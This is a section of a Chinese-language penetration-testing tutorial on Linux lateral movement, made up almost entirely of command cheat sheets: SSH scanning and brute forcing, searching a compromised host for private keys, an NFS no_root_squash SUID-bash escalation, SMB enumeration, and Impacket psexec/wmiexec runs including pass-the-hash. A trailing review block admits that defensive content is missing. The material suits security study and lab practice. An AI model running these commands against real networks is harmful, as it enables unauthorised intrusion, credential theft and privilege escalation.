# Linux 横向移动

### 4.1 SSH 横向移动

**SSH 信息收集**

```bash
# 扫描网段中的 SSH 服务
nmap -p 22 192.168.1.0/24
masscan 192.168.1.0/24 -p22 --rate=1000

# 测试 SSH 连接
ssh user@target_ip
ssh -i id_rsa user@target_ip

# 查看 SSH 版本
nc -v target_ip 22
ssh -v target_ip 2>&1 | grep -i "remote proto"
```

**SSH 凭据传递**

```bash
# 密码登录
ssh user@target_ip

# 密钥登录
ssh -i private_key user@target_ip

# 使用 sshpass 自动输入密码
sshpass -p 'password' ssh user@target_ip

# 代理转发（使用当前机器的 SSH Agent 访问跳板机后的机器）
ssh -A user@jump_host
# 在跳板机上可以直接 ssh 到内网其他机器
ssh user@internal_host
```

**SSH 密钥复用**

```bash
# 在攻陷的主机上查找 SSH 私钥
find / -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null

# 查找 authorized_keys
find / -name "authorized_keys" 2>/dev/null

# 查找 SSH 配置
cat /root/.ssh/config
cat /home/*/.ssh/config

# 查找已知主机
cat /root/.ssh/known_hosts
cat /home/*/.ssh/known_hosts
```

**SSH 暴力破解**

```bash
# 使用 Hydra
hydra -l user -P passwords.txt ssh://target_ip

# 使用 Medusa
medusa -u user -P passwords.txt -h target_ip -M ssh

# 使用 Nmap 脚本
nmap -p 22 --script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt target_ip
```

### 4.2 NFS 横向移动

**NFS 概述**

NFS（Network File System）是 Linux/Unix 系统中常用的网络文件系统协议，使用端口 2049。如果 NFS 配置不当，可能被用于横向移动。

**NFS 信息收集**

```bash
# 扫描 NFS 服务
nmap -p 111,2049 -sV target_ip
rpcinfo -p target_ip

# 查看 NFS 共享
showmount -e target_ip

# 查看共享详细信息
nmap -p 2049 --script nfs-showmount target_ip
nmap -p 2049 --script nfs-ls target_ip
```

**NFS 挂载和利用**

```bash
# 挂载 NFS 共享
mount -t nfs target_ip:/share /mnt/nfs

# 如果共享配置了 no_root_squash，可以创建 SUID 文件
cp /bin/bash /mnt/nfs/bash
chmod u+s /mnt/nfs/bash

# 然后在目标系统上执行
/mnt/share/bash -p
```

### 4.3 SMB/Samba 横向移动

**Samba 信息收集**

```bash
# 扫描 SMB 服务
nmap -p 139,445 -sV target_ip

# 列出共享
smbclient -L //target_ip -U user
smbclient -L //target_ip -N  # 空密码

# 使用 enum4linux
enum4linux target_ip
enum4linux -a target_ip
```

**SMB 连接和文件操作**

```bash
# 连接 SMB 共享
smbclient //target_ip/share -U user%password

# 挂载 SMB 共享
mount -t cifs //target_ip/share /mnt/smb -o username=user,password=password

# 使用 smbmap
smbmap -H target_ip -u user -p password
smbmap -H target_ip -u user -p password -R
```

**PsExec 类工具（Linux）**

```bash
# Impacket psexec
psexec.py user:password@target_ip
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 user@target_ip

# Impacket smbexec
smbexec.py user:password@target_ip

# Impacket wmiexec
wmiexec.py user:password@target_ip

# CrackMapExec
crackmapexec smb target_ip -u user -p password -x 'whoami'
```

### 4.4 RSH/Rlogin 横向移动

**RSH 概述**

RSH（Remote Shell）和 Rlogin 是较老的远程访问协议，使用端口 513 和 514。这些协议不安全（明文传输、基于主机信任），但在一些老旧系统中仍可能存在。

**检测和利用**

```bash
# 扫描 RSH/Rlogin 服务
nmap -p 513,514 -sV target_ip

# 使用 rlogin 连接
rlogin target_ip -l user

# 使用 rsh 执行命令
rsh target_ip -l user 'whoami'
```

---

---

## 📋 内容审核与补充建议

> 针对「Linux 横向移动」部分的内容审核结果：

### 📚 知识点补充
- ⚠️ 缺少knowledge相关内容

### 🎯 实战练习
- ⚠️ 缺少practice相关内容

### 🛡️ 防御方案
- ⚠️ 缺少defense相关内容

### 📖 参考资料
- ⚠️ 缺少参考资料/延伸阅读

---

## 📌 拓展学习资源

### 推荐学习路径
- 理论基础 → 工具实践 → 实战演练 → 深度研究
- 建议搭建本地实验环境进行动手练习

### 相关工具与资源
- 在线实验平台：Hack The Box、TryHackMe、VulnHub
- 技术文档：官方文档、RFC、OWASP 指南
- 社区资源：GitHub、安全论坛、技术博客
